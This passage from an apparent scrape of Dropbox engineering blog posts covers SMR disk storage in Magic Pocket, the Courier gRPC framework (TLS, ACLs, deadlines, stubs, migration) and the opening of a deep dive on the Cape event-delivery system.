pushing the limits of the SATA bus and it has become a bottleneck we can see from our SSDs. Future generations will likely have an NVMe design for caching. Network Magic Pocket started with lower density chassis (around 240TB). We moved up in density over time as network speeds increased and we didn’t have to compromise recovery time for density, which is a lever to lower TCO. Using 14TB SMR disks put the new chassis at 1.4PB per host. This level of storage density required another increase in network bandwidth to assist with system recovery. We are comfortable with an acceptable increase of the failure domain as long as the recovery time meets our SLA. We decided we needed to design the SMR based chassis with a 50Gbps NIC card per chassis and a non-blocking clos fabric network with 100Gbps uplinks. The benefit we gained is the ability to quickly add data to the chassis upon deployment and the ability to quickly drain the chassis in times of repair, ensuring Magic Pocket meets its SLA. Software Redesign Per the Magic Pocket design, Object Storage Devices (OSD) is a daemon the behaves very similar to key value store optimized for large-sized values. We run one daemon per disk per machine and only that daemon has access to the disk. OSD treats disks as a block device and directly manages data layout on the drive. By not using a filesystem on SMR, we are able to optimize head movements and prioritize disk IO operation based on the type fully within the software stack. To communicate with the SMR disk, we use Libzbc as the basis for disk IO. SMR stores metadata indexes on sequential zones. We got lucky with two factors. First, the capacity sizes evenly divide across 4 zones of logical space (256MB x 4 = 1GB). Had this not been divisible by 4, any excess space would have been lost or required more invasive changes to reclaim that space. Second, the ratio of metadata to block data is 0.03% which fits well with ratio of conventional area and sequential area. We discovered large writes are much better for SMR (averaging 4-5 MB). To optimize here, writes are buffered in certain stages. Originally, we tried flushing from SSD to SMR as soon as possible with multiple small writes, but this was not efficient, so we moved to model of buffering and less writes of larger size. In the OSD redesign, RPC routes live puts to the SSD for caching while gets and background writes are sent directly to a queue in the Disk Operations. This data is stored on the SMR. Our highest priority was managing live traffic. The live traffic is made up of incoming new blocks and writes to support that user data. One of the biggest challenges here is latency! All the writes to the disk must be sequential and aligned to the 4k boundary; however, when the live data comes in, it doesn’t always fit into neat 4k chunks. This is where using a staging area comes to our rescue. The background process of flushing these blocks from SSD to disk takes care of alignment and making sure we do large writes. Managing background repairs, which require a huge amount of reads and writes, is less time-critical, so they can occur more slowly. The Challenges of Using SMR The chief challenge of making a workload SMR-compatible is taking a random read/write activity and making it sequential. To accomplish this, we rewrote OSD so that metadata, which is frequently updated, is kept in the conventional area of the SMR disk where read/write writes are supported, while the immutable block data is kept on sequential zones. We needed to overcome dealing with sequential writes of SMR disks, which we accomplished with a few key workarounds. For example, we use an SSD as a staging area for live writes, while flushing them to the disk in the background. Since the SSD has a limited write endurance, we leverage the memory as a staging area for background operations. Our implementation of the software prioritizes live, user-facing read/writes over background job read/writes. We improved performance by batching writes into larger chunks, which avoids flushing the writes too often. Moving from Go to Rust also allowed us to handle more disks, and larger disks, without increased CPU and Memory costs by being able to directly control memory allocation and garbage collection. Check our presentation on how we used Rust to optimize storage at Dropbox to learn more. Through ongoing collaboration with our hardware partners, we leveraged cutting edge technology to ensure our entire chain of components were compatible. In our configuration, we used an expander to distribute the HBA Controller, allowing the HBA to evenly spread connection to all the drives. However, the expander was initially incompatible with SMR. In this case, and others like it, we collaborated with vendors and co-developed the firmware needed to create functional harmony within the hardware chain. One of the mechanical challenges of having an average of 100 drives in a chassis is that we are limited in how many hardware variations we can make when bottlenecks are discovered. Space is our limiter now, so looking at components that fit in the system design will present new challenges in the future. What’s Next? This new storage design now gives us the ability to work with future iterations of disk technologies. In the very immediate future we plan to focus on density designs and more efficient ways to handle large traffic volumes. With the total number of drives pushing the physical limit of this form factor our designs have to take into consideration potential failures from having that much data on a system while improving the efficacy of compute on the system. Conclusion We’re committed to iterating and improving on Magic Pocket and the Dropbox infrastructure, and this deployment is just one step along the way. This has been an exciting and challenging journey introducing new storage technology in a reliable way. This journey involved not only thinking about the mechanical structure of a system, but also the major software updates that would be required. Without the collaboration between the engineering teams this would not have been possible. Our infrastructure will benefit twofold, thanks to greater density and a better cost structure unleashing our Dropbox user’s creative energy. Debugging in the data center Project Contributors: Chris Dudte, Victor Li, Preslav Le, Jennifer Basalone, Alexander Sosa, Rajat Goel, Ashley Clark, James Turner, Vlad Seliverstov, Sujay Jayakar, Rami Aljamal // Tags Infrastructure Hardware Smr // Copy link Link copied Link copied", "date": "2018-06-12"},
{"website": "Dropbox", "title": "Courier: Dropbox migration to gRPC", "author": ["Ruslan Nigmatullin"], "link": "https://dropbox.tech/infrastructure/courier-dropbox-migration-to-grpc", "abstract": "The road to gRPC What Courier brings to gRPC Performance optimizations Implementation details Migration process Lessons learned Future Work We are hiring! Dropbox runs hundreds of services, written in different languages, which exchange millions of requests per second. At the core of our Service Oriented Architecture is Courier, our gRPC-based Remote Procedure Call (RPC) framework. While developing Courier, we learned a lot about extending gRPC, optimizing performance for scale, and providing a bridge from our legacy RPC system. Note: this post shows code generation examples in Python and Go. We also support Rust and Java. The road to gRPC Courier is not Dropbox’s first RPC framework. Even before we started to break our Python monolith into services in earnest, we needed a solid foundation for inter-service communication. Especially since the choice of the RPC framework has profound reliability implications. Previously, Dropbox experimented with multiple RPC frameworks. At first, we started with a custom protocol for manual serialization and de-serialization. Some services like our Scribe-based log pipeline used Apache Thrift . But our main RPC framework (legacy RPC) was an HTTP/1.1-based protocol with protobuf-encoded messages. For our new framework, there were several choices. We could evolve the legacy RPC framework to incorporate Swagger (now OpenAPI ). Or we could create a new standard . We also considered building on top of both Thrift and gRPC. We settled on gRPC primarily because it allowed us to bring forward our existing protobufs. For our use cases, multiplexing HTTP/2 transport and bi-directional streaming were also attractive. Note that if fbthrift had existed at the time, we may have taken a closer look at Thrift based solutions. What Courier brings to gRPC Courier is not a different RPC protocol—it’s just how Dropbox integrated gRPC with our existing infrastructure. For example, it needs to work with our specific versions of authentication, authorization, and service discovery. It also needs to integrate with our stats, event logging, and tracing tools. The result of all that work is what we call Courier. While we support using Bandaid as a gRPC proxy for a few specific use cases, the majority of our services communicate with each other with no proxy, to minimize the effect of the RPC on serving latency. We want to minimize the amount of boilerplate we write. Since Courier is our common framework for service development, it incorporates features which all services need. Most of these features are enabled by default, and can be controlled by command-line arguments. Some of them can also be toggled dynamically via a feature flag. Security: service identity and TLS mutual authentication Courier implements our standard service identity mechanism. All our servers and clients have their own TLS certificates, which are issued by our internal Certificate Authority. Each one has an identity, encoded in the certificate. This identity is then used for mutual authentication, where the server verifies the client, and the client verifies the server. On the TLS side, where we control both ends of the communication, we enforce quite restrictive defaults. Encryption with PFS is mandatory for all internal RPCs. The TLS version is pinned to 1.2+. We also restrict symmetric/asymmetric algorithms to a secure subset, with ECDHE-ECDSA-AES128-GCM-SHA256 being preferred. After identity is confirmed and the request is decrypted, the server verifies that the client has proper permissions. Access Control Lists (ACLs) and rate limits can be set on both services and individual methods. They can also be updated via our distributed config filesystem (AFS). This allows service owners to shed load in a matter of seconds, without needing to restart processes. Subscribing to notifications and handling configuration updates is taken care of by the Courier framework. Service “Identity” is the global identifier for ACLs, rate limits, stats, and more. As a side bonus, it’s also cryptographically secure. Here is an example of Courier ACL/ratelimit configuration definition from our Optical Character Recognition (OCR) service : Copy limits:\n  dropbox_engine_ocr:\n    # All RPC methods.\n    default:\n      max_concurrency: 32\n      queue_timeout_ms: 1000\n\n      rate_acls:\n        # OCR clients are unlimited.\n        ocr: -1\n        # Nobody else gets to talk to us.\n        authenticated: 0\n        unauthenticated: 0 We are considering adopting the SPIFFE Verifiable Identity Document (SVID), which is part of Secure Production Identity Framework for Everyone (SPIFFE). This would make our RPC framework compatible with various open source projects. Observability: stats and tracing Using just an identity, you can easily locate standard logs, stats, traces, and other useful information about a Courier service. Our code generation adds per-service and per-method stats for both clients and servers. Server stats are broken down by the client identity. Out of the box, we have granular attribution of load, errors, and latency for any Courier service. Courier stats include client-side availability and latency, as well as server-side request rates and queue sizes. We also have various break-downs like per-method latency histograms or per-client TLS handshakes. One of the benefits of having our own code generation is that we can initialize these data structures statically, including histograms and tracing spans. This minimizes the performance impact. Our legacy RPC only propagated request_id across API boundaries. This allowed joining logs from different services. In Courier, we’ve introduced an API based on a subset of the OpenTracing specification. We wrote our own client libraries, while the server-side is built on top of Cassandra and Jaeger . The details of how we made this tracing system performant warrant a dedicated blog post. Tracing also gives us the ability to generate a runtime service dependency graph. This helps engineers to understand all the transitive dependencies of a service. It can also potentially be used as a post-deploy check for avoiding unintentional dependencies. Reliability: deadlines and circuit-breaking Courier provides a centralized location for language specific implementations of functionality common to all clients, such as timeouts. Over time, we have added many capabilities at this layer, often as action items from postmortems. Deadlines Every gRPC request includes a deadline , indicating how long the client will wait for a reply. Since Courier stubs automatically propagate known metadata, the deadline travels with the request even across API boundaries. Within a process, deadlines are converted into a native representation. For example, in Go they are represented by a context.Context result from the WithDeadline method. In practice, we have fixed whole classes of reliability problems by forcing engineers to define deadlines in their service definitions. This context can travel even outside of the RPC layer! For example, our legacy MySQL ORM serializes the RPC context along with the deadline into a comment in the SQL query. Our SQLProxy can parse these comments and KILL queries when the deadline is exceeded. As a side benefit, we have per-request attribution when debugging database queries. Circuit-breaking Another common problem that our legacy RPC clients have to solve is implementing custom exponential backoff and jitter on retries. This is often necessary to prevent cascading overloads from one service to another. In Courier, we wanted to solve circuit-breaking in a more generic way. We started by introducing a LIFO queue between the listener and the workpool. In the case of a service overload, this LIFO queue acts as an automatic circuit breaker. The queue is not only bounded by size, but critically, it’s also bounded by time . A request can only spend so long in the queue. LIFO has the downside of request reordering. If you want to preserve ordering, you can use CoDel . It also has circuit breaking properties, but won’t mess with the order of requests. Introspection: debug endpoints Even though debug endpoints are not part of Courier itself, they are widely adopted across Dropbox. They are too useful to not mention! Here are a couple of examples of useful introspections. For security reasons, you may want to expose these on a separate port (possibly only on a loopback interface) or even a Unix socket (so access can be additionally controlled with Unix file permissions.) You should also strongly consider using mutual TLS authentication there by asking developers to present their certs to access debug endpoints (esp. non-readonly ones.) Runtime Having the ability to get an insight into the runtime state is a very useful debug feature, e.g. heap and CPU profiles could be exposed as HTTP or gRPC endpoints . We are planning on using this during the canary verification procedure to automate CPU/memory diffs between old and new code versions. These debug endpoints can allow modification of runtime state, e.g. a golang-based service can allow dynamically setting the GCPercent . Library For a library author being able to automatically export some library-specific data as an RPC-endpoint may be quite useful. Good examples here is that malloc library can dump its internal stats . Another example is a read/write debug endpoint to change the logging level of a service on the fly. RPC It is given that troubleshooting encrypted and binary-encoded protocols will be a bit complicated, therefore putting in as much instrumentation as performance allows in the RPC layer itself is the right thing to do. One example of such an introspection API is a recent channelz proposal for the gRPC . Application Being able to view application-level parameters can also be useful. A good example is a generalized application info endpoint with build/source hash, command line, etc. This can be used by the orchestration system to verify the consistency of a service deployment. Performance optimizations We discovered a handful of Dropbox specific performance bottlenecks when rolling out gRPC at scale. TLS handshake overhead With a service that handles lots of connections, the cumulative CPU overhead of TLS handshakes can become non-negligible. This is especially true during mass service restarts. We switched from RSA 2048 keypairs to ECDSA P-256 to get better performance for signing operations. Here are BoringSSL performance examples (note that RSA is still faster for signature verification): RSA: Copy 𝛌 ~/c0d3/boringssl bazel run -- //:bssl speed -filter 'RSA 2048'\nDid ... RSA 2048 signing operations in ..............  (1527.9 ops/sec)\nDid ... RSA 2048 verify (same key) operations in .... (37066.4 ops/sec)\nDid ... RSA 2048 verify (fresh key) operations in ... (25887.6 ops/sec) ECDSA: Copy 𝛌 ~/c0d3/boringssl bazel run -- //:bssl speed -filter 'ECDSA P-256'\nDid ... ECDSA P-256 signing operations in ... (40410.9 ops/sec)\nDid ... ECDSA P-256 verify operations in .... (17037.5 ops/sec) Since RSA 2048 verification is ~3x faster than ECDSA P-256 one, from a performance perspective, you may consider using RSA for your root/leaf certs. From a security perspective though it’s a bit more complicated since you’ll be chaining different security primitives and therefore resulting security properties will be the minimum of all of them. For the same performance reasons you should also think twice before using RSA 4096 (and higher) certs for your root/leaf certs. We also found that TLS library choice (and compilation flags) matter a lot for both performance and security. For example, here is a comparison of MacOS X Mojave’s LibreSSL build vs homebrewed OpenSSL on the same hardware: LibreSSL 2.6.4: Copy 𝛌 ~ openssl speed rsa2048\nLibreSSL 2.6.4\n...\n                  sign    verify    sign/s verify/s\nrsa 2048 bits 0.032491s 0.001505s     30.8    664.3 OpenSSL 1.1.1a: Copy 𝛌 ~ openssl speed rsa2048\nOpenSSL 1.1.1a  20 Nov 2018\n...\n                  sign    verify    sign/s verify/s\nrsa 2048 bits 0.000992s 0.000029s   1208.0  34454.8 But the fastest way to do a TLS handshake is to not do it at all! We’ve modified gRPC-core and gRPC-python to support session resumption, which made service rollout way less CPU intensive. Encryption is not expensive It is a common misconception that encryption is expensive. Symmetric encryption is actually blazingly fast on modern hardware. A desktop-grade processor is able to encrypt and authenticate data at 40Gbps rate on a single core: Copy 𝛌 ~/c0d3/boringssl bazel run -- //:bssl speed -filter 'AES'\nDid ... AES-128-GCM (8192 bytes) seal operations in ... 4534.4 MB/s Nevertheless, we did end up having to tune gRPC for our 50Gb/s storage boxes . We learned that when the encryption speed is comparable to the memory copy speed, reducing the number of memcpy operations was critical. In addition, we also made some of the changes to gRPC itself . Authenticated and encrypted protocols have caught many tricky hardware issues. For example, processor, DMA, and network data corruptions. Even if you are not using gRPC, using TLS for internal communication is always a good idea. High Bandwidth-Delay product links Dropbox has multiple data centers connected through a backbone network . Sometimes nodes from different regions need to communicate with each other over RPC, e.g. for the purposes of replication. When using TCP the kernel is responsible for limiting the amount of data inflight for a given connection (within the limits of /proc/sys/net/ipv4/tcp_{r,w}mem ), though since gRPC is HTTP/2-based it also has its own flow control on top of TCP. The upper bound for the BDP is hardcoded in grpc-go to 16Mb , which can become a bottleneck for a single high BDP connection. Golang’s net.Server vs grpc.Server In our Go code we initially supported both HTTP/1.1 and gRPC using the same net.Server . This was logical from the code maintenance perspective but had suboptimal performance. Splitting HTTP/1.1 and gRPC paths to be processed by separate servers and switching gRPC to grpc.Server greatly improved throughput and memory usage of our Courier services. golang/protobuf vs gogo/protobuf Marshaling and unmarshaling can be expensive when you switch to gRPC. For our Go code, we’ve switched to gogo/protobuf which noticeably decreased CPU usage on our busiest Courier servers. As always, there are some caveats around using gogo/protobuf , but if you stick to a sane subset of functionality you should be fine. Implementation details Starting from here, we are going to dig way deeper into the guts of Courier, looking at protobuf schemas and stub examples from different languages. For all the examples below we are going to use our Test service (the service we use in Courier’s integration tests). Service description Let’s look at the snippet from the Test service definition: Copy service Test {\n    option (rpc_core.service_default_deadline_ms) = 1000;\n\n    rpc UnaryUnary(TestRequest) returns (TestResponse) {\n        option (rpc_core.method_default_deadline_ms) = 5000;\n    }\n\n    rpc UnaryStream(TestRequest) returns (stream TestResponse) {\n        option (rpc_core.method_no_deadline) = true;\n    }\n    ...\n} As was mentioned in the reliability section above, deadlines are mandatory for all Courier methods. They can be set for the whole service with the following protobuf option: Copy option (rpc_core.service_default_deadline_ms) = 1000; Each method can also set its own deadline, overriding the service-wide one (if present). Copy option (rpc_core.method_default_deadline_ms) = 5000; In rare cases where deadline doesn’t really make sense (such as a method to watch some resource), the developer is allowed to explicitly disable it: Copy option (rpc_core.method_no_deadline) = true; The real service definition is also expected to have extensive API documentation, sometimes even along with usage examples. Stub generation Courier generates its own stubs instead of relying on interceptors (except for the Java case, where the interceptor API is powerful enough) mainly because it gives us more flexibility. Let’s compare our stubs to the default ones using Golang as an example. This is what default gRPC server stubs look like: Copy func _Test_UnaryUnary_Handler(srv interface{}, ctx context.Context, dec func(interface{}) error, interceptor grpc.UnaryServerInterceptor) (interface{}, error) {\n        in := new(TestRequest)\n        if err := dec(in); err != nil {\n                return nil, err\n        }\n        if interceptor == nil {\n                return srv.(TestServer).UnaryUnary(ctx, in)\n        }\n        info := &amp;grpc.UnaryServerInfo{\n                Server:     srv,\n                FullMethod: \"/test.Test/UnaryUnary\",\n        }\n        handler := func(ctx context.Context, req interface{}) (interface{}, error) {\n                return srv.(TestServer).UnaryUnary(ctx, req.(*TestRequest))\n        }\n        return interceptor(ctx, in, info, handler)\n} Here, all the processing happens inline: decoding the protobuf, running interceptors, and calling the UnaryUnary handler itself. Now let’s look at Courier stubs: Copy func _Test_UnaryUnary_dbxHandler(\n        srv interface{},\n        ctx context.Context,\n        dec func(interface{}) error,\n        interceptor grpc.UnaryServerInterceptor) (\n        interface{},\n        error) {\n\n        defer processor.PanicHandler()\n\n        impl := srv.(*dbxTestServerImpl)\n        metadata := impl.testUnaryUnaryMetadata\n\n        ctx = metadata.SetupContext(ctx)\n        clientId = client_info.ClientId(ctx)\n        stats := metadata.StatsMap.GetOrCreatePerClientStats(clientId)\n        stats.TotalCount.Inc()\n\n        req := &amp;processor.UnaryUnaryRequest{\n                Srv:            srv,\n                Ctx:            ctx,\n                Dec:            dec,\n                Interceptor:    interceptor,\n                RpcStats:       stats,\n                Metadata:       metadata,\n                FullMethodPath: \"/test.Test/UnaryUnary\",\n                Req:            &amp;test.TestRequest{},\n                Handler:        impl._UnaryUnary_internalHandler,\n                ClientId:       clientId,\n                EnqueueTime:    time.Now(),\n        }\n\n        metadata.WorkPool.Process(req).Wait()\n        return req.Resp, req.Err\n} That’s a lot of code, so let’s go over it line by line. First, we defer the panic handler that is responsible for automatic error collection. This allows us to send all uncaught exceptions to centralized storage for later aggregation and reporting: Copy defer processor.PanicHandler() One more reason for setting up a custom panic handler is to ensure that we abort application on panic. Default golang/net HTTP handler behavior is to ignore it and continue serving new requests (with potentially corrupted and inconsistent state). Then we propagate context by overriding its values from the metadata of the incoming request: Copy ctx = metadata.SetupContext(ctx)\nclientId = client_info.ClientId(ctx) We also create (and cache for efficiency purposes) the per-client stats on the server side for more granular attribution: Copy stats := metadata.StatsMap.GetOrCreatePerClientStats(clientId) This dynamically creates a per-client (i.e. per-TLS identity) stats in runtime. We also have per-method stats for each service and, since the stub generator has access to all the methods during the code generation time, we can statically pre-create these to avoid runtime overhead. Then we create the request structure, pass it to the work pool, and wait for the completion: Copy req := &amp;processor.UnaryUnaryRequest{\n        Srv:            srv,\n        Ctx:            ctx,\n        Dec:            dec,\n        Interceptor:    interceptor,\n        RpcStats:       stats,\n        Metadata:       metadata,\n        ...\n}\nmetadata.WorkPool.Process(req).Wait() Note that almost no work has been done by this point: no protobuf decoding, no interceptor execution, etc. ACL enforcement, prioritization, and rate-limiting happens inside the workpool before any of that is done. Note that the golang gRPC library supports the Tap interface , which allows very early request interception. This provides infrastructure for building efficient rate-limiters with minimal overhead. App-specific error codes Our stub generator also allows developers to define app-specific error codes through custom options: Copy enum ErrorCode {\n  option (rpc_core.rpc_error) = true;\n\n  UNKNOWN = 0;\n  NOT_FOUND = 1 [(rpc_core.grpc_code)=\"NOT_FOUND\"];\n  ALREADY_EXISTS = 2 [(rpc_core.grpc_code)=\"ALREADY_EXISTS\"];\n  ...\n  STALE_READ = 7 [(rpc_core.grpc_code)=\"UNAVAILABLE\"];\n  SHUTTING_DOWN = 8 [(rpc_core.grpc_code)=\"CANCELLED\"];\n} Within the same service, both gRPC and app errors are propagated, while between API boundaries all errors are replaced with UNKNOWN. This avoids the problem of accidental error proxying between different services, potentially changing their semantic meaning. Python-specific changes Our Python stubs add an explicit context parameter to all Courier handlers, e.g.: Copy from dropbox.context import Context\nfrom dropbox.proto.test.service_pb2 import (\n        TestRequest,\n        TestResponse,\n)\nfrom typing_extensions import Protocol\n\nclass TestCourierClient(Protocol):\n    def UnaryUnary(\n            self,\n            ctx,      # type: Context\n            request,  # type: TestRequest\n            ):\n        # type: (...) -&gt; TestResponse\n        ... At first, it looked a bit strange, but after some time developers got used to the explicit ctx just as they got used to self . Note that our stubs are also fully mypy-typed which pays off in full during large-scale refactoring. It also integrates nicely with some IDEs like PyCharm. Continuing the static typing trend, we also add mypy annotations to protos themselves: Copy class TestMessage(Message):\n    field: int\n\n    def __init__(self,\n        field : Optional[int] = ...,\n        ) -&gt; None: ...\n    @staticmethod\n    def FromString(s: bytes) -&gt; TestMessage: ... These annotations prevent many common bugs, such as assigning None to a string field in Python. This code is opensourced at dropbox/mypy-protobuf . Migration process Writing a new RPC stack is by no means an easy task, but in terms of operational complexity it still can’t be compared to the process of infra-wide migration to it. To assure the success of this project, we’ve tried to make it easier for the developers to migrate from legacy RPC to Courier. Since the migration by itself is a very error-prone process, we’ve decided to go with a multi-step process. Step 0: Freeze the legacy RPC Before we did anything, we froze the legacy RPC feature set so it’s no longer a moving target. This also gave people an incentive to move to Courier, since all new features like tracing and streaming were only available to services using Courier. Step 1: A common interface for the legacy RPC and Courier We started by defining a common interface for both legacy RPC and Courier. Our code generation was responsible for producing both versions of the stubs that satisfy this interface: Copy type TestServer interface {\n   UnaryUnary(\n      ctx context.Context,\n      req *test.TestRequest) (\n      *test.TestResponse,\n      error)\n   ...\n} Step 2: Migration to the new interface Then we started switching each service to the new interface but continued using legacy RPC. This was often a huge diff touching all the methods in the service and its clients. Since this is the most error-prone step, we wanted to de-risk it as much as possible by changing one variable at a time. Low profile services with a small number of methods and spare error budget can do the migration in a single step and ignore this warning. Step 3: Switch clients to use Courier RPC As part of the Courier migration, we also started running both legacy and Courier servers in the same binary on different ports. Now changing the RPC implementation is a one-line diff to the client: Copy class MyClient(object):\n  def __init__(self):\n-   self.client = LegacyRPCClient('myservice')\n+   self.client = CourierRPCClient('myservice') Note that using that model we can migrate one client at a time, starting with ones that have lower SLAs like batch processing and other async jobs. Step 4: Clean up After all service clients have migrated it is time to prove that legacy RPC is not used anymore (this can be done statically by code inspection and at runtime looking at legacy server stats.) After this step is done developers can proceed to clean up and remove old code. Lessons learned At the end of the day, what Courier brings to the table is a unified RPC framework that speeds up service development, simplifies operations, and improves Dropbox reliability. Here are the main lessons we’ve learned during the Courier development and deployment: Observability is a feature. Having all the metrics and breakdowns out-of-the-box is invaluable during troubleshooting. Standardization and uniformity are important. They lower cognitive load, and simplify operations and code maintenance. Try to minimize the amount of boilerplate code developers need to write. Codegen is your friend here. Make migration as easy as possible. Migration will likely take way more time than the development itself. Also, migration is only finished after cleanup is performed. RPC framework can be a place to add infrastructure-wide reliability improvements, e.g. mandatory deadlines, overload protection, etc. Common reliability issues can be identified by aggregating incident reports on a quarterly basis. Future Work Courier, as well as gRPC itself, is a moving target so let’s wrap up with the Runtime team and Reliability teams’ roadmaps. In relatively near future we wanted to add a proper resolver API to Python’s gRPC code, switch to C++ bindings in Python/Rust, and add full circuit breaking and fault injection support. Later next year we are planning on looking into ALTS and moving TLS handshake to a separate process (possibly even outside of the services’ container.) We are hiring! Do you like runtime-related stuff? Dropbox has a globally distributed edge network, terabits of traffic, millions of requests per second, and comfy small teams in both Mountain View and San Francisco. Traffic/Runtime/Reliability teams are hiring both SWEs and SREs to work on TCP/IP packet processors and load balancers, HTTP/gRPC proxies, and our internal service mesh runtime: Courier/gRPC, Service Discovery, and AFS. Not your thing? We’re also hiring for a wide variety of engineering positions in San Francisco, New York, Seattle, Tel Aviv, and other offices around the world . Acknowledgments Contributors: Ashwin Amit, Can Berk Guder, Dave Zbarsky, Giang Nguyen, Mehrdad Afshari, Patrick Lee, Ross Delinger, Ruslan Nigmatullin, Russ Allbery, Santosh Ananthakrishnan. We are also very grateful to the gRPC team for their support. // Tags Infrastructure Networking Security Monitoring // Copy link Link copied Link copied", "date": "2019-01-08"},
{"website": "Dropbox", "title": "Cape Technical Deep Dive", "author": ["Peng Kang"], "link": "https://dropbox.tech/infrastructure/cape-technical-deep-dive", "abstract": "Architecture: why not just a queue? Why build a dispatcher? Deep Dive into two important elements Wrap up We introduced Cape in a previous post . In a nutshell, Cape is a framework for enabling real-time asynchronous event processing at a large scale with strong guarantees. It has been over a year since the system was launched. Today Cape is a critical component for Dropbox infrastructure. It operates with both high performance and reliability at a very large scale. Here are a few key metrics, Cape is: running on thousands of servers across the continent subscribing to over 30 different event domains at a rate of 30K/s processing jobs of various sizes at rate of 150K/s delivering 95% of events under 1 second after they are created. Cape has been widely adopted by teams at Dropbox. Currently there are over 70 use cases registered under Cape’s framework, and we expect Cape adoption to continue to grow in the future. In this post, we’ll take a deep dive into the design of the Cape framework. First, we’ll discuss Cape’s architecture. Then we’ll look at the core scheduling component of the system. Throughout, we’ll focus the discussion on a few key design decisions. Cape is an event delivery system. Conceptually, it can be thought of as a pipe, as below. At one end event sources notify Cape of new events. At the other end events are consumed by various topologies. Design principles behind Cape Before we begin, let’s touch on a few of our principles for developing and maintaining Cape. These principles were proposed based on learnings from the development of other systems at Dropbox, especially from Cape’s predecessor Livefill. These principles were critical for both the project’s success and the ongoing maintenance of the system. Modularization From the beginning we explicitly took a modular approach to system design; this is critical for isolating complexities. We created modules with clearly defined functionalities, and carefully designed the communication protocols between these modules. This way, when building a module we only needed to worry about a limited number of issues. Testing was easy since we could verify each module independently. We also want to highlight the importance of keeping module interface to a minimum. It’s easier to reason about interaction between the modules when their interfaces are small. What’s more, a small interface is more easily adapted to new use cases. Clear boundaries between system logic and application-specific logic In Cape it’s common for a component to contain procedures for both system logic and application-specific logic. For instance, the dispatcher’s tracker queries information from the event source (application specific), and produces scheduling requests based on query results (system logic). We carefully designed Cape’s abstraction to ensure there is a clear boundary between the two categories. As illustrated in the following figure, system logic and application specific query logic are separated by an intermediate layer. It translates generic queries issued by the tracker into specific queries to different event sources. This boundary ensures that the system is easily extensible, and that logic for different event sources is completely isolated. Evolution of terminology The following terms and concepts are necessary for understanding the fundamentals of how Cape functions. During the course of Cape's development, definitions for the following key terms and concepts evolved and became further refined. Readers may wish to re-read the previous post for a refresh. Otherwise, a quick recap will promote the following discussion. In Cape’s world, an event is a piece of persisted data. The key for any event has two components. One component is a subject, of type string. The second component is sequence ID, of type integer. Events with the same subject are ordered by their sequence IDs, and those with different subjects are considered independent. A namespace for events that are constructed in the same way is a domain. Topology is our notion of a user application. Topologies that subscribe to the same domains can form ordering dependencies. In other words, users can specify a set of other topologies that must run before their own topologies do. Lambdas carry out execution. Conceptually, lambdas are callbacks that are invoked with a set of events provided as input. Going back to topology, a topology consists of one or more lambdas. Within the scope of a topology, lambdas may form data dependency. This means a lambda can generate output regarding an event, and the output will become input for one or more other lambdas when processing the same event. Why have multiple lambdas carry out a topology’s logic? At Dropbox one popular motivation is data vicinity. If a topology’s workflow can be divided into stages that process data in different datacenters, then it’s more efficient to colocate the computation with data. In this case a user may choose to have multiple lambdas running in different data centers. For each subject's topology, we maintain the sequence ID of the last successfully processed event. This value is called a cursor. All the cursors of a single subject are included in one protobuf object, which we call cursor info. Cursor info is persisted and can be retrieved with the subject as key. Architecture: why not just a queue? Cape is an event delivery system. Conceptually, it can be thought of as a pipe, as below. At one end event sources notify Cape of new events. At the other end events are consumed by various topologies. An intuitive solution would be to build Cape with a queue at its core. Sources could publish events to the queue and topologies could consume from it as independent consumer groups. But Cape is not a passive queue. It's an active and intelligent system that fetches events from sources, and delivers them to the topologies. Instead of sending events to Cape, the sources only send pings—lightweight reminders about new events from a particular subject. Upon receiving pings, Cape performs sophisticated analysis and then issues jobs to workers. A refresh component sends pings for backlog processing. This dynamic is captured below. A queue-based solution isn’t enough to meet requirements Cape’s event-processing design is result of the following requirements for how events should be delivered: low latency: events should be delivered as fast as possible retry until success: each event is guaranteed to be eventually successfully processed by all subscribing topologies subject level isolation: failures in one subject shouldn’t impact the processing of events from other subjects event source reliability: event sources are external services and therefore they can fail from time to time. The system must be able to tolerate failures such as when sources fail to send out events. Although a queue is the natural solution for event delivery, if we take the above requirements into consideration, it quickly becomes apparent that a queue-based solution isn’t enough. Imagine building a queue-based system that satisfies Cape’s requirements. For simplicity, we’ll limit our discussion to a few common and mature solutions for queues: Kafka, Redis, and SQS. Queue-based solutions require event sources to reliably push each event to the system. Additionally, events are pushed with correct ordering, meaning that for the same subject, events with smaller sequence IDs are pushed first. Now let’s go through some of the above requirements. Low latency Comparatively speaking, publishing to Kafka is significantly faster than SQS. Kafka is designed for low latency publishing. We can set up Kafka clusters in Dropbox infrastructure, so its network latency is going to be much lower than using SQS. Redis has very low latency when data is only in memory. However when it’s configured to persist snapshot data, there can be significant negative impact on its availability. Retry until success In a queue-based solution, this is equivalent to a requirement for persistency. Both Kafka and SQS support data persistency very well. For Redis, as mentioned above, persistency can be achieved to some extent by taking periodic snapshots, which impacts availability. Additionally, a Redis cluster with persisted data is usually more difficult to maintain compared to Kafka or SQS. Subject level isolation Subject level isolation is the biggest barrier to queueing. It’s not practical to create a queue for each subject; there can be billions of them. The problem with using Kafka for queuing is that Kafka requires each consumer to acknowledge each event after it’s been successfully processed. This introduces a severe head-of-the-line blocking problem because it prevents processing any other subjects’ events until the one at the head of the queue is successfully processed. The latency is unacceptable—there are thousands of subjects generating events every second, and lambda runtime can vary from milliseconds to tens of minutes. Delivery latency could be improved by decoupling an event’s read and acknowledgement phases. This would allow consumers to keep reading new events while asynchronously acknowledging them after successful processing. But, if any event misses getting processed the consumer will have to rewind and reprocess a potentially large amount of other subjects’ events. This rewind is necessary to provide an “at least once” success guarantee for every event. Essentially, failure in one subject can introduce duplicated processing and extra latency to other subjects, which breaks the isolation between subjects. SQS provides a better solution for this kind of isolation. When an event is being consumed it is invisible to other consumers, until a specified deadline is reached. Once successful processing has finished the consumer acknowledges it and the event is removed from the queue. This allows consumers to keep fetching new events, without having to worry about rewind on failures. However, with SQS there is a problem when ordered processing is taken into consideration. Although it has a first-in, first out (FIFO) option that provides ordered consumption, it comes at the cost of limited throughput. Otherwise the problem is that, before processing an event, there is no way for a consumer to know whether an event’s predecessors were successfully processed. Without knowing that, guarantees of ordered processing cannot be made. Complicating the issue, a record indicating which consumer gets the right to exclusively process which subject would have to be made (to ensure events of the same subjects are processed in order). This kind of bookkeeping can be tricky to maintain and we would need to build the service for necessary bookkeeping. The requirement for subject level isolation is also problematic when using Redis for queuing. In practice, consuming an event from Redis means removing it from the queue. This creates a durability issue. The event will be lost if the consumer crashes, a very common event. While it’s possible to let the consumer peek at the event and only remove it after it’s successfully processed, that also leads to a head-of-the-line blocking problem, and it doesn’t solve the issue of lost events. 